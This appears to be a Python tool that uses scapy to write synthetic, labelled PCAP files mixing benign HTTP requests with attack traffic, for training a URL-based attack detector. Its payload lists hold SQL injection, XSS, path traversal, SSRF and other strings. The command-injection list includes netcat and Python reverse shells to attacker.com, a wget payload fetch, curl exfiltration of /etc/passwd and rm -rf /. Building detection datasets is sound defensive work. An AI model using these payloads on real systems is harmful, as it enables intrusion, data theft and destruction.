"""
PCAP Dataset Generator.
Generates synthetic PCAP files with benign and malicious HTTP traffic
for training/testing the URL-based attack detection system.

Uses scapy to craft packets with various attack patterns:
- SQL Injection
- XSS (Cross-Site Scripting)
- Path Traversal / LFI
- Command Injection
- LDAP Injection
- Open Redirect
- SSRF attempts
- Benign traffic for baseline
"""

import logging
import os
import random
import string
import csv
import json
from datetime import datetime, timedelta
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)

# ── Try importing scapy ──────────────────────────────────────────────────────
try:
    from scapy.all import (
        Ether, IP, TCP, Raw, wrpcap, RandMAC, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.error(
        "scapy is not installed. PCAP generation requires scapy. "
        "Install with: pip install scapy"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Attack Type Definitions
# ─────────────────────────────────────────────────────────────────────────────

class AttackType(Enum):
    BENIGN = "benign"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    OPEN_REDIRECT = "open_redirect"
    SSRF = "ssrf"
    XXE = "xxe"
    HEADER_INJECTION = "header_injection"


@dataclass
class GeneratedRequest:
    """Represents a generated HTTP request with metadata."""
    source_ip: str
    dest_ip: str
    source_port: int
    dest_port: int
    method: str
    host: str
    path: str
    query_string: str
    user_agent: str
    attack_type: AttackType
    timestamp: datetime
    full_url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)

    def __post_init__(self):
        scheme = "https" if self.dest_port == 443 else "http"
        url = f"{scheme}://{self.host}{self.path}"
        if self.query_string:
            url += f"?{self.query_string}"
        self.full_url = url


# ─────────────────────────────────────────────────────────────────────────────
# Payload Libraries
# ─────────────────────────────────────────────────────────────────────────────

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "1' AND '1'='1",
    "') OR ('1'='1",
    "' OR 1=1#",
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "-1' UNION SELECT 1,2,3--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "'; EXEC xp_cmdshell('dir')--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--",
    "1' AND (SELECT COUNT(*) FROM users)>0--",
    "admin' AND '1'='1",
    "' OR ''='",
    "' OR 'a'='a",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=\"javascript:alert('XSS')\">",
    "<div style=\"background:url('javascript:alert(1)')\">",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=\"alert(1)\">",
    "<math><maction actiontype=\"statusline#http://attacker.com\">",
    "<svg/onload=alert('XSS')>",
    "<img src=1 onerror=alert(1)>",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
]

# Path Traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "....\\....\\....\\etc\\passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255cetc/passwd",
    "/var/log/apache2/access.log",
    "../../../var/log/auth.log",
    "....//....//....//var/www/html/config.php",
    "..;/..;/..;/etc/passwd",
    "../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "/..../..../..../etc/passwd",
    "..0x2f..0x2f..0x2fetc/passwd",
]

# Command Injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "; ping -c 10 attacker.com",
    "| nc attacker.com 4444 -e /bin/sh",
    "&& wget http://attacker.com/shell.sh",
    "; curl http://attacker.com/exfil?data=$(cat /etc/passwd)",
    "|| dir",
    "| type C:\\Windows\\System32\\config\\SAM",
    "; rm -rf /",
    "& net user hacker hacker123 /add",
    "`sleep 10`",
    "$(sleep 10)",
    "; echo vulnerable",
    "| base64 /etc/passwd",
    "&& cat /etc/shadow",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "| rev /etc/passwd",
]

# LDAP Injection payloads
LDAP_INJECTION_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "admin)(|(password=*))",
    "*)(objectClass=*",
    "x)(|(cn=*)",
    "*))%00",
    "admin)(!(&(1=0",
    "*)(uid=admin))",
    "*()|%26'",
    "admin*",
    "*)(mail=*",
    "x' or name()='username' or 'x'='y",
]

# Open Redirect payloads
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "http://evil.com",
    "//evil.com/path",
    "https://evil.com@legitimate.com",
    "javascript:alert(document.domain)",
    "//google.com%2f@evil.com",
    "https://legitimate.com.evil.com",
    "/redirect?url=http://evil.com",
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://localhost/admin",
    "http://127.0.0.1/admin",
    "http://[::1]/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "file:///etc/passwd",
    "dict://localhost:11211/stat",
    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "http://0.0.0.0/",
    "http://127.1/",
    "http://2130706433/",  # Decimal IP for 127.0.0.1
    "http://0x7f000001/",  # Hex IP for 127.0.0.1
    "http://localtest.me/",
    "http://customer1.app.localhost/",
]

# Benign paths and parameters
BENIGN_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products",
    "/api/users", "/api/products", "/api/orders",
    "/login", "/logout", "/register", "/profile",
    "/search", "/cart", "/checkout", "/help",
    "/images/logo.png", "/css/style.css", "/js/main.js",
    "/blog", "/blog/post/1", "/blog/category/tech",
    "/news", "/events", "/faq", "/terms", "/privacy",
    "/dashboard", "/settings", "/notifications",
    "/api/v1/health", "/api/v1/status", "/api/v2/data",
]

BENIGN_PARAMS = [
    "page=1", "limit=10", "sort=asc", "order=name",
    "q=laptop", "category=electronics", "brand=apple",
    "id=123", "user=john", "lang=en", "format=json",
    "from=2024-01-01", "to=2024-12-31", "status=active",
    "view=list", "filter=recent", "type=product",
]

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "PostmanRuntime/7.35.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# Attack user agents (suspicious)
ATTACK_USER_AGENTS = [
    "sqlmap/1.7.12#dev",
    "nikto/2.5.0",
    "Nmap Scripting Engine",
    "masscan/1.3",
    "dirbuster",
    "gobuster/3.6",
    "wfuzz/3.1.0",
    "nuclei",
    "burpsuite",
    "ZAP/2.14.0",
] + USER_AGENTS  # Also use normal agents to evade detection

# Target hosts
TARGET_HOSTS = [
    "example.com", "test-app.local", "api.example.com",
    "shop.example.com", "admin.example.com", "secure.example.com",
    "192.168.1.100", "10.0.0.50", "webapp.internal",
]


# ─────────────────────────────────────────────────────────────────────────────
# Generator Class
# ─────────────────────────────────────────────────────────────────────────────

class PCAPGenerator:
    """
    Generates synthetic PCAP files with labeled HTTP traffic.
    
    Creates a mix of benign and malicious requests for ML training datasets.
    """

    def __init__(
        self,
        output_dir: str = "pcap_files",
        seed: Optional[int] = None
    ):
        if not SCAPY_AVAILABLE:
            raise ImportError("scapy is required for PCAP generation")
        
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        
        if seed is not None:
            random.seed(seed)
        
        # Suppress scapy warnings
        conf.verb = 0

    def _random_ip(self, internal: bool = True) -> str:
        """Generate a random IP address."""
        if internal:
            prefixes = ["192.168.1.", "10.0.0.", "172.16.0."]
            return random.choice(prefixes) + str(random.randint(1, 254))
        else:
            return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _random_port(self) -> int:
        """Generate a random source port."""
        return random.randint(49152, 65535)

    def _url_encode(self, text: str) -> str:
        """Simple URL encoding for special characters."""
        encoded = ""
        for char in text:
            if char.isalnum() or char in "-_.~":
                encoded += char
            else:
                encoded += f"%{ord(char):02X}"
        return encoded

    def _generate_benign_request(self, timestamp: datetime) -> GeneratedRequest:
        """Generate a benign HTTP request."""
        path = random.choice(BENIGN_PATHS)
        query = ""
        
        # 60% chance to add query parameters
        if random.random() < 0.6:
            num_params = random.randint(1, 3)
            params = random.sample(BENIGN_PARAMS, min(num_params, len(BENIGN_PARAMS)))
            query = "&".join(params)
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method=random.choice(["GET", "GET", "GET", "POST", "HEAD"]),
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(USER_AGENTS),
            attack_type=AttackType.BENIGN,
            timestamp=timestamp,
        )

    def _generate_sql_injection(self, timestamp: datetime) -> GeneratedRequest:
        """Generate SQL injection attack request."""
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        path = random.choice(["/login", "/search", "/api/users", "/products", "/admin"])
        param_name = random.choice(["id", "user", "username", "search", "q", "category", "order"])
        
        # Randomly encode or leave as-is
        if random.random() < 0.3:
            payload = self._url_encode(payload)
        
        query = f"{param_name}={payload}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method=random.choice(["GET", "POST"]),
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.SQL_INJECTION,
            timestamp=timestamp,
        )

    def _generate_xss(self, timestamp: datetime) -> GeneratedRequest:
        """Generate XSS attack request."""
        payload = random.choice(XSS_PAYLOADS)
        path = random.choice(["/search", "/comment", "/profile", "/api/message", "/feedback"])
        param_name = random.choice(["q", "query", "search", "name", "message", "comment", "input"])
        
        if random.random() < 0.4:
            payload = self._url_encode(payload)
        
        query = f"{param_name}={payload}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method=random.choice(["GET", "POST"]),
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.XSS,
            timestamp=timestamp,
        )

    def _generate_path_traversal(self, timestamp: datetime) -> GeneratedRequest:
        """Generate path traversal attack request."""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        
        # Path traversal can be in path or parameter
        if random.random() < 0.5:
            path = f"/download/{payload}"
            query = ""
        else:
            path = random.choice(["/download", "/file", "/read", "/view", "/include", "/load"])
            param_name = random.choice(["file", "path", "page", "template", "doc", "include"])
            query = f"{param_name}={payload}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method="GET",
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.PATH_TRAVERSAL,
            timestamp=timestamp,
        )

    def _generate_command_injection(self, timestamp: datetime) -> GeneratedRequest:
        """Generate command injection attack request."""
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
        path = random.choice(["/ping", "/lookup", "/exec", "/admin/run", "/api/execute", "/tools"])
        param_name = random.choice(["cmd", "command", "host", "ip", "target", "exec", "run"])
        
        if random.random() < 0.3:
            payload = self._url_encode(payload)
        
        query = f"{param_name}=test{payload}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method=random.choice(["GET", "POST"]),
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.COMMAND_INJECTION,
            timestamp=timestamp,
        )

    def _generate_ldap_injection(self, timestamp: datetime) -> GeneratedRequest:
        """Generate LDAP injection attack request."""
        payload = random.choice(LDAP_INJECTION_PAYLOADS)
        path = random.choice(["/ldap", "/directory", "/lookup", "/search", "/api/user"])
        param_name = random.choice(["user", "username", "uid", "cn", "filter", "query"])
        
        query = f"{param_name}={self._url_encode(payload)}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443]),
            method="GET",
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.LDAP_INJECTION,
            timestamp=timestamp,
        )

    def _generate_open_redirect(self, timestamp: datetime) -> GeneratedRequest:
        """Generate open redirect attack request."""
        payload = random.choice(OPEN_REDIRECT_PAYLOADS)
        path = random.choice(["/redirect", "/goto", "/out", "/link", "/url", "/redir", "/return"])
        param_name = random.choice(["url", "redirect", "next", "return", "dest", "target", "goto"])
        
        query = f"{param_name}={self._url_encode(payload)}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443]),
            method="GET",
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.OPEN_REDIRECT,
            timestamp=timestamp,
        )

    def _generate_ssrf(self, timestamp: datetime) -> GeneratedRequest:
        """Generate SSRF attack request."""
        payload = random.choice(SSRF_PAYLOADS)
        path = random.choice(["/fetch", "/proxy", "/api/fetch", "/image", "/load", "/check"])
        param_name = random.choice(["url", "uri", "path", "src", "dest", "target", "fetch"])
        
        query = f"{param_name}={self._url_encode(payload)}"
        
        return GeneratedRequest(
            source_ip=self._random_ip(),
            dest_ip=self._random_ip(),
            source_port=self._random_port(),
            dest_port=random.choice([80, 443, 8080]),
            method="GET",
            host=random.choice(TARGET_HOSTS),
            path=path,
            query_string=query,
            user_agent=random.choice(ATTACK_USER_AGENTS),
            attack_type=AttackType.SSRF,
            timestamp=timestamp,
        )

    def _request_to_packet(self, req: GeneratedRequest) -> bytes:
        """Convert a GeneratedRequest to a scapy packet."""
        # Build HTTP request string
        url_path = req.path
        if req.query_string:
            url_path += f"?{req.query_string}"
        
        http_lines = [
            f"{req.method} {url_path} HTTP/1.1",
            f"Host: {req.host}",
            f"User-Agent: {req.user_agent}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
        ]
        
        # Add extra headers for POST
        if req.method == "POST":
            http_lines.append("Content-Type: application/x-www-form-urlencoded")
            http_lines.append("Content-Length: 0")
        
        http_lines.append("")  # Empty line to end headers
        http_lines.append("")
        
        http_payload = "\r\n".join(http_lines)
        
        # Build packet
        pkt = (
            Ether(src=RandMAC(), dst=RandMAC()) /
            IP(src=req.source_ip, dst=req.dest_ip) /
            TCP(sport=req.source_port, dport=req.dest_port, flags="PA") /
            Raw(load=http_payload.encode())
        )
        
        return pkt

    def generate_requests(
        self,
        num_requests: int = 1000,
        attack_ratio: float = 0.3,
        attack_distribution: Optional[Dict[AttackType, float]] = None
    ) -> List[GeneratedRequest]:
        """
        Generate a list of HTTP requests with specified attack ratio.
        
        Args:
            num_requests: Total number of requests to generate
            attack_ratio: Ratio of attack requests (0.0 to 1.0)
            attack_distribution: Optional dict mapping attack types to their ratios
                                 (should sum to 1.0). If None, uses equal distribution.
        
        Returns:
            List of GeneratedRequest objects
        """
        if attack_distribution is None:
            attack_types = [
                AttackType.SQL_INJECTION,
                AttackType.XSS,
                AttackType.PATH_TRAVERSAL,
                AttackType.COMMAND_INJECTION,
                AttackType.LDAP_INJECTION,
                AttackType.OPEN_REDIRECT,
                AttackType.SSRF,
            ]
            attack_distribution = {at: 1.0 / len(attack_types) for at in attack_types}
        
        generators = {
            AttackType.SQL_INJECTION: self._generate_sql_injection,
            AttackType.XSS: self._generate_xss,
            AttackType.PATH_TRAVERSAL: self._generate_path_traversal,
            AttackType.COMMAND_INJECTION: self._generate_command_injection,
            AttackType.LDAP_INJECTION: self._generate_ldap_injection,
            AttackType.OPEN_REDIRECT: self._generate_open_redirect,
            AttackType.SSRF: self._generate_ssrf,
        }
        
        requests = []
        base_time = datetime.now()
        
        num_attacks = int(num_requests * attack_ratio)
        num_benign = num_requests - num_attacks
        
        # Generate benign requests
        for i in range(num_benign):
            ts = base_time + timedelta(seconds=random.uniform(0, 3600))
            requests.append(self._generate_benign_request(ts))
        
        # Generate attack requests
        attack_types = list(attack_distribution.keys())
        attack_weights = list(attack_distribution.values())
        
        for i in range(num_attacks):
            ts = base_time + timedelta(seconds=random.uniform(0, 3600))
            attack_type = random.choices(attack_types, weights=attack_weights, k=1)[0]
            generator = generators.get(attack_type, self._generate_sql_injection)
            requests.append(generator(ts))
        
        # Shuffle to mix benign and attacks
        random.shuffle(requests)
        
        # Re-assign sequential timestamps
        for i, req in enumerate(requests):
            req.timestamp = base_time + timedelta(seconds=i * random.uniform(0.1, 2.0))
        
        return requests

    def write_pcap(
        self,
        requests: List[GeneratedRequest],
        filename: str = "generated_traffic.pcap"
    ) -> str:
        """
        Write requests to a PCAP file.
        
        Returns the path to the generated file.
        """
        filepath = os.path.join(self.output_dir, filename)
        packets = [self._request_to_packet(req) for req in requests]
        wrpcap(filepath, packets)
        logger.info(f"Written {len(packets)} packets to {filepath}")
        return filepath

    def write_labels(
        self,
        requests: List[GeneratedRequest],
        filename: str = "labels.csv"
    ) -> str:
        """
        Write request labels to a CSV file for training.
        
        Returns the path to the generated file.
        """
        filepath = os.path.join(self.output_dir, filename)
        
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([
                "timestamp", "source_ip", "dest_ip", "method", "host",
                "path", "query_string", "full_url", "user_agent",
                "attack_type", "is_attack"
            ])
            
            for req in requests:
                writer.writerow([
                    req.timestamp.isoformat(),
                    req.source_ip,
                    req.dest_ip,
                    req.method,
                    req.host,
                    req.path,
                    req.query_string,
                    req.full_url,
                    req.user_agent,
                    req.attack_type.value,
                    0 if req.attack_type == AttackType.BENIGN else 1
                ])
        
        logger.info(f"Written {len(requests)} labels to {filepath}")
        return filepath

    def generate_dataset(
        self,
        num_requests: int = 1000,
        attack_ratio: float = 0.3,
        pcap_filename: str = "generated_traffic.pcap",
        labels_filename: str = "labels.csv",
        attack_distribution: Optional[Dict[AttackType, float]] = None
    ) -> Tuple[str, str, Dict]:
        """
        Generate a complete dataset with PCAP and labels.
        
        Returns:
            Tuple of (pcap_path, labels_path, statistics)
        """
        logger.info(f"Generating dataset: {num_requests} requests, {attack_ratio*100:.1f}% attacks")
        
        requests = self.generate_requests(num_requests, attack_ratio, attack_distribution)
        pcap_path = self.write_pcap(requests, pcap_filename)
        labels_path = self.write_labels(requests, labels_filename)
        
        # Calculate statistics
        stats = {
            "total_requests": len(requests),
            "benign": sum(1 for r in requests if r.attack_type == AttackType.BENIGN),
            "attacks": sum(1 for r in requests if r.attack_type != AttackType.BENIGN),
            "attack_breakdown": {}
        }
        
        for attack_type in AttackType:
            count = sum(1 for r in requests if r.attack_type == attack_type)
            if count > 0:
                stats["attack_breakdown"][attack_type.value] = count
        
        logger.info(f"Dataset statistics: {json.dumps(stats, indent=2)}")
        
        return pcap_path, labels_path, stats


# ─────────────────────────────────────────────────────────────────────────────
# CLI Entry Point
# ─────────────────────────────────────────────────────────────────────────────

def main():
    """Command-line interface for generating PCAP datasets."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Generate synthetic PCAP datasets for URL attack detection"
    )
    parser.add_argument(
        "-n", "--num-requests",
        type=int,
        default=1000,
        help="Number of requests to generate (default: 1000)"
    )
    parser.add_argument(
        "-r", "--attack-ratio",
        type=float,
        default=0.3,
        help="Ratio of attack traffic (default: 0.3)"
    )
    parser.add_argument(
        "-o", "--output-dir",
        type=str,
        default="pcap_files",
        help="Output directory (default: pcap_files)"
    )
    parser.add_argument(
        "--pcap-name",
        type=str,
        default="generated_traffic.pcap",
        help="PCAP filename (default: generated_traffic.pcap)"
    )
    parser.add_argument(
        "--labels-name",
        type=str,
        default="labels.csv",
        help="Labels filename (default: labels.csv)"
    )
    parser.add_argument(
        "-s", "--seed",
        type=int,
        default=None,
        help="Random seed for reproducibility"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose logging"
    )
    
    args = parser.parse_args()
    
    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    
    try:
        generator = PCAPGenerator(output_dir=args.output_dir, seed=args.seed)
        pcap_path, labels_path, stats = generator.generate_dataset(
            num_requests=args.num_requests,
            attack_ratio=args.attack_ratio,
            pcap_filename=args.pcap_name,
            labels_filename=args.labels_name,
        )
        
        print(f"\n✓ Dataset generated successfully!")
        print(f"  PCAP file:   {pcap_path}")
        print(f"  Labels file: {labels_path}")
        print(f"\n  Statistics:")
        print(f"    Total requests: {stats['total_requests']}")
        print(f"    Benign:         {stats['benign']}")
        print(f"    Attacks:        {stats['attacks']}")
        print(f"\n  Attack breakdown:")
        for attack_type, count in stats['attack_breakdown'].items():
            if attack_type != 'benign':
                print(f"    {attack_type}: {count}")
        
    except ImportError as e:
        print(f"Error: {e}")
        print("Install scapy with: pip install scapy")
        return 1
    except Exception as e:
        logger.exception("Failed to generate dataset")
        print(f"Error: {e}")
        return 1
    
    return 0


if __name__ == "__main__":
    exit(main())
